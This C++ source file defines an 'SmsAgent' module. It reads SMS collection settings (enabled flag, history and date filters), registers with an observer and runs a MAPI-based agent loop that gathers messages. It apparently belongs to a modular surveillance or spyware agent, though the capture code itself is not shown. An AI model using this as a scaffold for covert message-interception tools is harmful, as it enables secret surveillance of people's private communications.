#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "Log.h"
#include "Observer.h"
#include "MAPIAgent.h"

DWORD WINAPI SmsAgent(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	Configuration *conf = me->getConf();
	HANDLE eventHandle;

	MAPIAgent* agent = MAPIAgent::Instance();
	Observer *observerObj = Observer::self();
	MSG Msg;

	BOOL smsEnabled = FALSE, history = FALSE;
	wstring dateFrom, dateTo;
	JSONObject filter;

	// Cosi si prende la conf per SMS, per tutti gli altri e' uguale
	// cambia solo il nome dell'array
	try {
		smsEnabled = conf->getBoolFromArray(L"sms", L"enabled");

		filter = conf->getObjectFromArray(L"sms", L"filter");

		history = conf->getBoolFromObject(filter, L"history");
		dateFrom = conf->getStringFromObject(filter, L"datefrom");
		dateTo = conf->getStringFromObject(filter, L"dateto");
	} catch (...) {
		smsEnabled = FALSE;
	}

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();

	DBG_TRACE(L"Debug - Messages.cpp - Messages Module started\n", 5, FALSE);

	// Registriamoci all'observer
	if (observerObj->Register(GetCurrentThreadId()) == FALSE) {
		me->setStatus(MODULE_STOPPED);
		DBG_TRACE(L"Debug - Messages.cpp - Messages Module [cannot register to Observer, exiting]\n", 5, FALSE);
		return 0;
	}

	/*if (agent->Init(lpConfig, cbConfig) == FALSE) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}*/

	if (agent->Run(0) == FALSE) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	LOOP {
		// Diciamo semplicemente alla coda di farli passare tutti
		if (observerObj->GetMessage() != NULL) {
			observerObj->MarkMessage(GetCurrentThreadId(), IPC_PROCESS, FALSE);
		}

		if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE) != 0) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}

		// Keep the sleeping time at 50, otherwise the MAIL agent WON'T WORK!!!
		WaitForSingleObject(eventHandle, 50);
		
		if (me->shouldStop())
			break;
	}

	agent->Quit();
	agent->WaitForCollector();
	agent->Destroy();

	observerObj->UnRegister(GetCurrentThreadId());

	me->setStatus(MODULE_STOPPED);
	DBG_TRACE(L"Debug - Messages.cpp - Messages Module clean stop\n", 5, FALSE);
	return 0;
}